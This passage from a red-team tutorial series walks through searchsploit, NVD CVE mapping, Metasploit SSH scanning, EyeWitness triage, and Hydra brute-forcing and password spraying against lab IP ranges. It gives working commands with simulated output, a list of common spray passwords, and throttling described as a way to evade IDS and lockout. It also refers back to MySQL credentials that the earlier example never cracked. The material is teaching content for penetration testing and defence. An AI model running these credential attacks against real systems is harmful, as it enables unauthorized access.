**Key Takeaway:** The internal IP disclosure in the Location header is a critical network reconnaissance finding — it reveals the actual internal IP scheme (`10.x.0.0/8`) behind a potential reverse proxy, enabling more accurate pivot planning. phpinfo() disclosure is a separate critical finding that must be reported regardless of other vulnerabilities. Defenders should remove phpinfo() pages, configure proper redirect behavior, and set all security headers.

**Why It Matters:** Nikto serves as a rapid automated quality check that catches well-known issues that manual testing might miss due to time pressure. Its findings are tied to OSVDB identifiers that map directly to CVE numbers, making report writing straightforward. Red teamers use nikto output to populate the "automated scan findings" section of the report and to identify investigation priorities they may have missed in manual testing.

---

## Example 23: Searchsploit — Searching ExploitDB for a Service Version

**What this covers:** Searchsploit is a command-line interface to the Exploit-DB archive, the largest public repository of exploit code and proof-of-concept scripts. Given a service name and version, searchsploit returns all matching exploits with file paths to local copies. This bridges the gap between version detection and actual exploitation — from `nmap -sV` output to runnable exploit code in seconds.

**Scenario:** Version detection revealed Apache 2.4.25, MySQL 5.7.28, Apache Tomcat 9.0.30, and OpenSSH 7.4p1 on `192.0.2.5`. Search ExploitDB for applicable exploits for each service.

```bash
# Search for Apache 2.4.25 exploits
searchsploit apache 2.4.25

# => Exploit Title                                          |  Path
# => Apache 2.4.x - Options Interpreter Buffer Overflow    | linux/remote/47032.c
# => Apache 2.4.25 - Optionsbleed (CVE-2017-9798)          | linux/dos/42745.py
# => Apache 2.4.0 < 2.4.29 - 'mod_auth_digest' Memory     | linux/remote/43204.py
# => CVE-2017-9798: returns memory from other connections  # => information disclosure

# Search for MySQL 5.7 exploits
searchsploit mysql 5.7

# => MySQL 5.6/5.7 - 'sys_vars' Privilege Escalation       | linux/local/40360.c
# => MySQL 5.x - 'mysqld_safe' Local Privilege Escalation  | linux/local/43809.c
# => Note: most MySQL exploits require local access — need DB creds first

# Search for Tomcat 9.0 exploits
searchsploit apache tomcat 9.0

# => Apache Tomcat 9.0.0.M1 < 9.0.30 - Ghostcat File Read | java/webapps/48143.py
#    CVE-2020-1938 — AJP connector file read (CVSS 9.8)    # => critical! — version matches!
# => Apache Tomcat - CGIServlet enableCmdLineArguments RCE  | java/webapps/47073.py

# View the Ghostcat exploit details
searchsploit -x 48143  # => opens the exploit file in less for reading without copying

# Copy the Ghostcat exploit to working directory for modification
searchsploit -m 48143
# => Exploit: Apache Tomcat 9.0.0.M1 < 9.0.30 - Ghostcat File Read
# => cp /usr/share/exploitdb/exploits/java/webapps/48143.py ghostcat.py
# => Copied to: /current/working/directory/ghostcat.py

# Search for OpenSSH 7.4 exploits
searchsploit openssh 7.4

# => OpenSSH 2.3 < 7.7 - Username Enumeration               | linux/remote/45233.py
# => CVE-2018-15473 — timing-based user enum                  # => confirmed vulnerability
# => OpenSSH 7.7 - Username Enumeration (2)                  | linux/remote/45939.py

# Update local ExploitDB database
searchsploit -u
# => [*] Updating database...
# => [i] Updating the Exploit Database...
# => [+] Done — /usr/share/exploitdb updated
```

**Key Takeaway:** Ghostcat (CVE-2020-1938, CVSS 9.8) directly matches the Tomcat 9.0.30 version — the exploit script exists locally and is ready to run against the AJP port (8009). This single version-to-exploit mapping elevates `192.0.2.5` to "critical" priority in the engagement. Defenders must update Tomcat to 9.0.31+ or later and disable the AJP connector in `server.xml` if it is not needed for Apache-Tomcat proxying.

**Why It Matters:** Searchsploit closes the version-detection-to-exploitation loop with an offline database query — no internet connection needed during the engagement. Red teamers run searchsploit against every service version found during the nmap phase to build an exploit priority list before attempting any active exploitation. The offline nature is essential for air-gapped engagements and eliminates the risk of internet query logging.

---

## Example 24: CVE Lookup for a Discovered Service Version — Mapping to NVD

**What this covers:** The National Vulnerability Database (NVD) at nvd.nist.gov is the authoritative source for CVE details including CVSS scores, attack vectors, and remediation guidance. Mapping version strings from nmap directly to CVEs in the NVD produces the structured vulnerability findings that drive the risk-scoring section of an engagement report.

**Scenario:** You have identified Apache 2.4.25, OpenSSH 7.4p1, MySQL 5.7.28, and Tomcat 9.0.30. Perform systematic CVE lookups to build a prioritized vulnerability register.

```bash
# Method 1: NVD API (curl) — query programmatically
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache+2.4.25&resultsPerPage=5" \
  | python3 -m json.tool | grep -A 3 '"id"'

# => "id": "CVE-2017-9798"    # => Optionsbleed — information disclosure
# => "id": "CVE-2017-7679"    # => mod_mime buffer overflow — CVSS 9.8 critical
# => "id": "CVE-2017-7668"    # => ap_find_token buffer overread
# => "id": "CVE-2017-3169"    # => mod_ssl null pointer dereference
# => "id": "CVE-2017-3167"    # => authentication bypass in UseCanonicalName — CVSS 9.8

# Method 2: searchsploit --cve for direct CVE-to-exploit mapping
searchsploit --cve CVE-2017-7679
# => Exploit: Apache HTTP Server 2.2.x/2.4.x - mod_mime Buffer Overread
# => Path: /usr/share/exploitdb/exploits/linux/dos/43204.py

# Method 3: Build a CVE register from version strings
# Create a structured assessment register
cat << 'EOF' > /tmp/cve-register.md
| Service         | Version   | CVE             | CVSS | Severity | Attack Vector |
|-----------------|-----------|-----------------|------|----------|---------------|
| Apache httpd    | 2.4.25    | CVE-2017-7679   | 9.8  | Critical | Network       |
| Apache httpd    | 2.4.25    | CVE-2017-3167   | 9.8  | Critical | Network       |
| OpenSSH         | 7.4p1     | CVE-2018-15473  | 5.3  | Medium   | Network       |
| MySQL           | 5.7.28    | CVE-2020-2574   | 5.9  | Medium   | Network       |
| Apache Tomcat   | 9.0.30    | CVE-2020-1938   | 9.8  | Critical | Network       |
| Samba           | 4.5.16    | CVE-2017-7494   | 9.8  | Critical | Network       |
EOF
cat /tmp/cve-register.md

# Verify Samba CVE-2017-7494 (SambaCry) — Samba 3.5.0-4.6.4 vulnerable
# Samba 4.5.16 is WITHIN the vulnerable range: critical!
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2017-7494" \
  | python3 -m json.tool | grep -E '"baseScore"|"attackVector"|"description"' | head -10
# => "description": "is_known_pipename() in Samba allows remote code execution"
# => "attackVector": "NETWORK"   # => exploitable remotely without local access
# => "baseScore": 9.8            # => critical CVSS — highest priority

# Filter for Network-vector Critical CVEs (highest-priority targets)
grep "Critical.*Network" /tmp/cve-register.md
# => Apache httpd   2.4.25  CVE-2017-7679  9.8  Critical  Network
# => Apache httpd   2.4.25  CVE-2017-3167  9.8  Critical  Network
# => Apache Tomcat  9.0.30  CVE-2020-1938  9.8  Critical  Network
# => Samba          4.5.16  CVE-2017-7494  9.8  Critical  Network
# => Four network-exploitable critical CVEs on this single host!
```

**Key Takeaway:** Four CVSS 9.8 network-exploitable CVEs on a single host means this target can be compromised through multiple independent paths — Ghostcat, SambaCry, and two Apache vulnerabilities — any one of which leads to remote code execution. Defenders need a patch management program with SLA targets: critical network-exploitable CVEs must be patched within 72 hours of vendor disclosure.

**Why It Matters:** The CVE register is the deliverable that translates technical scan results into risk language that executives and security managers understand. CVSS scores define remediation priority and SLA compliance. Red teamers build this register during the reconnaissance phase so the exploitation phase follows a risk-ordered attack sequence — highest CVSS first — maximizing the probability of demonstrating critical impact within the engagement window.

---

## Example 25: Metasploit Basic Usage — Auxiliary Module for SSH Version Scanning

**What this covers:** Metasploit Framework is the most widely used penetration testing platform, combining exploits, auxiliary modules, post-exploitation tools, and payload generation in a single framework. Auxiliary modules perform non-exploitation tasks — scanning, enumeration, brute-forcing, and fuzzing. Learning msfconsole navigation, module search, configuration, and execution is foundational for any red team engagement.

**Scenario:** Use Metasploit's SSH version scanner auxiliary module to enumerate SSH versions across the `192.0.2.0/24` subnet, then explore the framework's module structure as a learning exercise.

```bash
# Launch Metasploit console
msfconsole

# => [*] Starting the Metasploit Framework console...
# =>                                                  #
# =>       =[ metasploit v6.3.44-dev                 ]=
# => + -- --=[ 2362 exploits - 1232 auxiliary        ]=--
# => + -- --=[ 413 post                               ]=--
# =>                                                  #
# msf6 >

# Search for SSH-related auxiliary modules
msf6 > search type:auxiliary name:ssh

# => Matching Modules
# => ===============
# =>    #  Name                                       Rank    Description
# =>    -  ----                                       ----    -----------
# =>    0  auxiliary/scanner/ssh/ssh_version          normal  SSH Version Scanner
# =>    1  auxiliary/scanner/ssh/ssh_login            normal  SSH Login Check Scanner
# =>    2  auxiliary/scanner/ssh/ssh_enumusers        normal  SSH Username Enumeration
# =>    3  auxiliary/scanner/ssh/ssh_identify_pubkeys normal  SSH Public Key Acceptance Scanner

# Select the SSH version scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
# => msf6 auxiliary(scanner/ssh/ssh_version) >

# Show all configurable options
msf6 auxiliary(scanner/ssh/ssh_version) > show options

# => Module options (auxiliary/scanner/ssh/ssh_version):
# =>    Name     Current Setting  Required  Description
# =>    ----     ---------------  --------  -----------
# =>    RHOSTS                    yes       The target host(s), range CIDR identifier
# =>    RPORT    22               yes       The target port (default 22)
# =>    THREADS  1                yes       The number of concurrent threads

# Configure the target range
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.0.2.0/24
# => RHOSTS => 192.0.2.0/24

msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 10
# => THREADS => 10    # => 10 parallel scans — faster across /24

# Run the module
msf6 auxiliary(scanner/ssh/ssh_version) > run

# => [*] 192.0.2.1:22 - SSH server version: SSH-2.0-OpenSSH_7.9
# => [+] 192.0.2.5:22 - SSH server version: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
# =>     (language: )     # => older version — CVE-2018-15473 applies
# => [*] 192.0.2.10:22 - SSH server version: SSH-2.0-OpenSSH_8.9p1 Ubuntu
# => [*] Scanned 256 of 256 hosts (100% complete)
# => [*] Auxiliary module execution completed

# Save results to Metasploit database for later queries
msf6 > db_status
# => [*] Connected to msf. Connection type: postgresql.

msf6 > hosts
# => Hosts
# => =====
# => address      mac  name  os_name  os_sp  purpose  info  comments
# => -------      ---  ----  -------  -----  -------  ----  --------
# => 192.0.2.1             Linux                     device
# => 192.0.2.5             Linux    Debian           server
# => 192.0.2.10            Linux    Ubuntu           server

msf6 > exit
```

**Key Takeaway:** Metasploit's database (`db_status`, `hosts`, `services`) persists all scan results across sessions, building a structured engagement record without manual note-taking. Setting THREADS to 10 scans the /24 in parallel, reducing scan time by 10x. Defenders should monitor for the characteristic Metasploit probe patterns — sequential connection attempts with specific timeout characteristics — in SSH access logs and IDS alerts.

**Why It Matters:** Metasploit is the industry standard for exploit verification in professional penetration testing. Learning its navigation model — search, use, show options, set, run — before attempting actual exploitation is essential because the same workflow applies identically to every module in the framework, from auxiliary scanners to full remote code execution exploits. The database integration makes it suitable for multi-day engagements across large target ranges.

---

## Example 26: Hydra Brute-Force — SSH Login Against Your Own Lab

**What this covers:** Hydra is a parallelized login cracker supporting SSH, FTP, HTTP, SMB, and dozens of other protocols. It automates credential testing at high speed against authentication services. In authorized penetration tests, brute-forcing is performed against targets with no account lockout policy — verified in Example 18's SMB enumeration showing lockout threshold of None.

**Scenario:** You have a confirmed user list (`root`, `admin`, `john.smith`) from SMB enumeration and SSH username enumeration. The target `192.0.2.5` has no account lockout. Run Hydra against SSH using the rockyou wordlist against your authorized lab target.

```bash
# Basic SSH brute-force — single username, rockyou wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.0.2.5

# -l admin     single username (lowercase -l for single, uppercase -L for list)
# -P           password file (uppercase -P for file, lowercase -p for single password)
# ssh://       protocol and target

# => [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
# => [DATA] attacking ssh://192.0.2.5:22/
# => [22][ssh] host: 192.0.2.5   login: admin   password: admin123
# =>           # => password found! "admin123" — trivially weak
# => 1 of 1 target successfully completed, 1 valid password found

# Multiple usernames — use username list file
echo -e "root\nadmin\njohn.smith" > /tmp/users.txt
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 4 -s 22 ssh://192.0.2.5

# -L /tmp/users.txt   user list file
# -t 4                4 parallel tasks (reduce for SSH — too many triggers rate limiting)
# -s 22               port number

# => [22][ssh] host: 192.0.2.5  login: root        password: toor
#              # => root with default "toor" password — direct root access!
# => [22][ssh] host: 192.0.2.5  login: john.smith  password: password123

# FTP brute-force using same credentials (credential reuse is common)
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.0.2.5
# => [21][ftp] host: 192.0.2.5  login: admin  password: admin123
# => Same password reused on FTP — credential reuse confirmed

# HTTP Basic auth brute-force against /admin/ discovered by gobuster
hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
  http-get://192.0.2.5/admin/
# http-get  HTTP GET with Basic authentication
# => [80][http-get] host: 192.0.2.5  login: admin  password: admin123
# => Web admin panel accessible with cracked credentials

# Save successful credentials
echo "192.0.2.5 SSH admin:admin123" >> /tmp/credentials.txt
echo "192.0.2.5 SSH root:toor" >> /tmp/credentials.txt
echo "192.0.2.5 FTP admin:admin123" >> /tmp/credentials.txt
```

**Key Takeaway:** Root SSH access via the default password `toor` (root reversed) is an immediate full system compromise requiring zero exploitation skill — it is a credential failure, not a technical vulnerability. The credential reuse of `admin:admin123` across SSH, FTP, and HTTP demonstrates why password uniqueness per service is critical. Defenders must enforce password complexity, implement account lockout, and deploy fail2ban to automatically block brute-force sources.

**Why It Matters:** Password brute-forcing against services with no lockout is often the fastest path to initial access — faster than exploit development and far more reliable than complex vulnerability chaining. The rockyou wordlist (14.3 million passwords) covers the most common real-world passwords from breach databases. Red teamers exhaust credential attacks before vulnerability exploitation because recovered credentials provide clean, authenticated access with lower forensic impact than exploit-based shells.

---

## Example 27: Password Spraying — Why Spraying Beats Brute-Force for Lockout Evasion

**What this covers:** Password spraying tests one or a small set of common passwords against many usernames, rather than many passwords against one username. This technique bypasses account lockout policies — if lockout triggers after 5 failed attempts per account, spraying one password across 100 accounts generates only 1 attempt per account, staying under the threshold. Spraying is the primary credential attack strategy in environments with lockout enabled.

**Scenario:** A different target domain, `198.51.100.0/24`, has SSH enabled on multiple hosts with account lockout set to 5 attempts. You have a user list of 50 accounts from OSINT. Demonstrate the spraying concept with a controlled, authorized test.

```bash
# Understanding the math:
# Brute-force: 14,344,399 passwords × 1 user = triggers lockout after 5 attempts
# Password spray: 1 password × 50 users = 1 attempt per account, never locks out

# Step 1: Build a user list from OSINT (from Examples 2 and 18)
cat /tmp/users.txt
# => root
# => admin
# => john.smith
# => jane.doe
# => helpdesk
# => (add all users discovered from theHarvester and SMB enumeration)

# Step 2: Build a targeted spray list — common passwords for this organization
cat << 'EOF' > /tmp/spray-passwords.txt
Password1          # => meets most complexity requirements: upper, lower, digit, 8+ chars
Welcome1           # => second most common "complex" password in breach databases
Company2024!       # => company name + year pattern — very common in enterprises
Summer2024!        # => season + year — common rotation pattern
Target2024         # => organization name + year — always test this
January2024!       # => month + year — common when password resets are monthly
EOF

# Step 3: Spray with a delay between rounds to avoid IDS detection
# Manual spray using Hydra with throttling
hydra -L /tmp/users.txt -p "Password1" -t 1 -w 5 ssh://198.51.100.10
# -t 1   only 1 task (serial, not parallel) — reduces noise
# -w 5   wait 5 seconds between attempts — evades time-based detection

# => [22][ssh] host: 198.51.100.10  login: jane.doe  password: Password1
# => jane.doe uses "Password1" — spray successful on first attempt

# Spray next password after a delay (simulate multiple rounds)
sleep 300   # => wait 5 minutes between password rounds — mimics human pattern
hydra -L /tmp/users.txt -p "Welcome1" -t 1 -w 5 ssh://198.51.100.10

# Spray across multiple hosts simultaneously
for host in 198.51.100.10 198.51.100.20 198.51.100.30; do
  echo "Spraying $host..."
  hydra -L /tmp/users.txt -p "Password1" -t 1 ssh://"$host" 2>/dev/null
  # => Same password tested across all discovered SSH hosts
  # => Credential reuse means one found password may work on multiple hosts
done

# Key spray password categories to test (in priority order):
# 1. Seasonal+Year:     Summer2024!, Winter2024!
# 2. Company+Year:      TargetCorp2024!, Target2024
# 3. Generic complex:   Password1, Welcome1, P@ssword1
# 4. Month+Year:        January2024!, May2026!
# 5. Common phrases:    Letmein1!, Qwerty123!
```

**Key Takeaway:** Password spraying with organization-specific candidates (`TargetCorp2024!`) dramatically outperforms generic wordlists because users follow predictable patterns when creating "complex" passwords on a deadline. The 5-minute delay between spray rounds evades IDS rules that alert on multiple failed logins within a short window. Defenders should deploy a centralized SIEM rule that detects the spray pattern — many accounts, one password, distributed time — not just per-account lockout counters.

**Why It Matters:** Password spraying is the dominant credential attack technique in real-world red team engagements against Active Directory and enterprise Linux environments because organizations universally implement lockout policies but rarely implement spray detection. A single spray hit on `helpdesk` or `admin` with a default password provides the initial foothold that launches the entire post-exploitation phase. Red teamers maintain a curated, organization-aware spray list rather than raw wordlists when lockout is confirmed.

---

## Example 28: Screenshot Capture with EyeWitness — Automating Web Service Recon

**What this covers:** EyeWitness connects to web services discovered during scanning and takes screenshots of each URL, generating an HTML report with all screenshots and HTTP headers. When a scan reveals dozens of web services across a target environment, manually visiting each URL is impractical — EyeWitness automates visual triage, letting you instantly identify high-value targets like admin panels, default credentials pages, and application login forms.

**Scenario:** Your subdomain enumeration and port scanning have discovered web services on multiple hosts and ports. Use EyeWitness to screenshot all discovered web endpoints and generate a visual report for triage.

```bash
# Create a target list of all discovered web URLs
cat << 'EOF' > /tmp/web-targets.txt
http://192.0.2.5
https://192.0.2.5
http://192.0.2.5:8080
http://192.0.2.5/admin
http://192.0.2.5/phpmyadmin
http://192.0.2.10
http://192.0.2.100
http://198.51.100.10
http://198.51.100.20
http://198.51.100.30
EOF

# Run EyeWitness against the target list
eyewitness --web -f /tmp/web-targets.txt \
  --timeout 10 \
  --threads 5 \
  -d /tmp/eyewitness-report \
  --no-prompt

# --web          screenshot web services (also supports --rdp, --vnc)
# -f             input file with URLs (one per line)
# --timeout 10   10-second timeout per URL (increase for slow servers)
# --threads 5    5 concurrent screenshot threads
# -d             output directory for HTML report and screenshots
# --no-prompt    skip interactive prompts (for automation)

# --- EyeWitness output ---
# [*] Attempting to screenshot http://192.0.2.5
# [*] Attempting to screenshot https://192.0.2.5
# [*] Attempting to screenshot http://192.0.2.5:8080
# [+] http://192.0.2.5 - Apache 2.4.25 - screenshot saved    # => web server captured
# [+] http://192.0.2.5:8080 - Apache Tomcat 9.0.30 default page  # => default page = low security
# [+] http://192.0.2.5/admin - HTTP 401 Basic Auth prompt    # => admin panel confirmed visually
# [+] http://192.0.2.5/phpmyadmin - phpMyAdmin login page    # => MySQL management UI visible
# [*] 10 URLs processed in 23.4 seconds
# [*] Report written to /tmp/eyewitness-report/report.html

# Open the HTML report (in a browser or terminal)
# The report categorizes findings by:
# - Default credentials pages (highest priority)
# - Login pages (high priority — try discovered credentials)
# - Error pages (medium — may reveal debug info)
# - Normal pages (low — for completeness)

# Integrate with nmap XML output for automated web discovery
nmap -sV -p 80,443,8080,8443,8000,8888 192.0.2.0/24 \
  -oX /tmp/nmap-web.xml 2>/dev/null

eyewitness --web --nmap /tmp/nmap-web.xml \
  --timeout 10 \
  --threads 5 \
  -d /tmp/eyewitness-nmap-report \
  --no-prompt
# --nmap   parse nmap XML directly — automatically extracts all web-serving ports
# => Discovers and screenshots all web services found by nmap in one automated step
# => Generates categorized report: default creds, login pages, interesting pages

# Extract URLs of all captured pages with HTTP 200 for follow-up investigation
grep "200" /tmp/eyewitness-report/report.html | grep -o 'http[^"]*' | sort -u
# => http://192.0.2.5
# => http://192.0.2.5:8080
# => http://192.0.2.5/phpmyadmin   # => phpMyAdmin — login with cracked MySQL root creds
# => http://198.51.100.20            # => another live web service discovered via nmap
```

**Key Takeaway:** EyeWitness integrates directly with nmap XML output (`--nmap /tmp/nmap-web.xml`), transforming the entire web discovery and visual triage workflow into two commands — nmap to find web ports, EyeWitness to screenshot them all. The phpMyAdmin screenshot combined with the cracked MySQL root credentials from Example 26 completes the attack chain: credentials provide database access through a visual web interface. Defenders should restrict phpMyAdmin access by source IP or remove it from internet-accessible servers entirely.

**Why It Matters:** Visual recon with EyeWitness is the definitive first step for any engagement covering more than five web services — it collapses hours of manual URL visits into a scannable HTML report that reveals default credential pages and admin panels in seconds. Red teamers open the EyeWitness report immediately after running nmap to identify the two or three highest-value web targets for credential testing, dramatically accelerating the path from reconnaissance to initial access.
